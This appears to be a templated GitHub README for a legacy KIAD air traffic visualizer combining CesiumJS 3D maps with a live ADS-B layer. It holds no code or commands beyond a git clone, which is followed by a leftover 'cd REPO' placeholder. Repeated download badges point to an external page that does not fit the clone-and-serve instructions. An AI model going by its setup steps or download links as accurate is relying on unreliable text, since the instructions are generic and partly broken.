# KIAD ATC Visualization v2026 - aviation visualization 2026

> **A browser-based KIAD air traffic visualization that pairs CesiumJS 3D mapping with a live ADS-B layer and runs as a local web application in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/colewillke6166/kiad-adsb-atc-visualizer?style=flat-square)](https://github.com/colewillke6166/kiad-adsb-atc-visualizer)

---

<p align="center">
  <a href="https://colewillke6166.github.io/kiad-adsb-atc-visualizer/">
    <img src="https://img.shields.io/badge/Download-KIAD%20ATC%20Visualization%20Latest-brightgreen?style=for-the-badge" alt="Download KIAD ATC Visualization">
  </a>
</p>

> **[Download KIAD ATC Visualization v2026](https://colewillke6166.github.io/kiad-adsb-atc-visualizer/)**

---

[Download Latest Build](https://colewillke6166.github.io/kiad-adsb-atc-visualizer/)

---

## Project Overview

KIAD ATC Visualization is a web application for viewing aviation activity around KIAD through a CesiumJS-powered 3D geographic scene. A live ADS-B overlay adds aircraft activity to the map, while a local web server provides the environment needed to run the application.

This repository is a legacy ATC visualization experiment. It provides a useful reference for connecting geographic mapping, aircraft data overlays, and proxy-based workflows in a browser interface. Repository metadata identifies the maintained direction for users who want to investigate related or newer implementations.

---

## What It Includes

- Three-dimensional aviation scene rendering through CesiumJS
- Live ADS-B aircraft activity displayed over the map
- KIAD-centered visualization for airport-specific monitoring
- Local-server workflow for hosting and opening the application
- Browser delivery through the web platform
- Proxy-focused handling for data integration
- ATC-style presentation for aviation activity visualization
- Legacy organization that may help guide future revisions

---

## Getting Started

Obtain the repository by cloning it or downloading the source, then serve the project from a local web server.

git clone https://github.com/colewillke6166/kiad-adsb-atc-visualizer.git
cd REPO

When the application is not served by an existing workflow, launch a local web server of your choice and open the project in a browser.

---

## Running the Application

1. Bring up the local web server.
2. Visit the application URL in a supported browser.
3. Confirm that the Cesium view opens with KIAD as its center.
4. Inspect aircraft activity through the ADS-B layer.
5. Modify the server or browser configuration if proxying or data access requires it.

A typical check sequence is:

- start the server
- open the web application
- make sure the 3D scene renders
- verify that ADS-B aircraft data is visible
- update the proxy route when required by the local environment

---

## Settings and Data Flow

The primary setup is determined by the web application and the local server. To customize the environment, inspect the project files responsible for the Cesium scene, ADS-B feed processing, and server proxy configuration.

The configuration concept can be represented as:

{
  "airport": "KIAD",
  "mapEngine": "CesiumJS",
  "dataFeed": "ADS-B",
  "delivery": "local web server"
}

---

## System Requirements

- A current web browser with modern JavaScript and WebGL support
- A local web server capable of hosting the application
- Access to the ADS-B source or the configured data route
- Hardware suitable for displaying a Cesium-based 3D scene
- Network connectivity when remote feeds or proxying are part of the setup

---

## Common Questions

**Does this repository contain the maintained implementation?**  
No. It is identified in the repository metadata as a legacy KIAD ATC Cesium experiment, with a maintained alternative referenced there.

**How can I find current project information?**  
Review the repository metadata and its related project references. This repository is presented as a legacy project.

**Why might the page show an empty display?**  
Check that the local server is active, WebGL is available in the browser, and the ADS-B feed or proxy route has been configured properly.

**Is the airport or data pipeline replaceable?**  
The application is built around KIAD. Changing the airport focus or data flow depends on the organization of the scene, feed, and server configuration in the repository.

**Who may find this project useful?**  
It can serve people working on aviation visualization, experimenting with ATC-oriented mapping, or learning about CesiumJS and ADS-B integration.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
